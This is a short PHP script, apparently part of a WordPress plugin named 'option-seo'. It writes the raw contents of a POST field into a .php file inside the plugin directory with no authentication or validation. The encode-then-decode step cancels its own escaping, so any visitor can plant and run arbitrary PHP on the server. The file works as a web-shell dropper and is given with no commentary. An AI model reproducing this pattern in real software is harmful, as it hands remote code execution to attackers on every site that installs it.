<?php
session_start();
$opseoinstall = $_POST['newins'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/option-seo/installed.php', 'w');
$opseoinstall = str_replace('\\', '', $opseoinstall);
$opseoinstall = htmlentities($opseoinstall);
fwrite($fp, html_entity_decode($opseoinstall));
fclose($fp);
echo $opseoinstall;
?>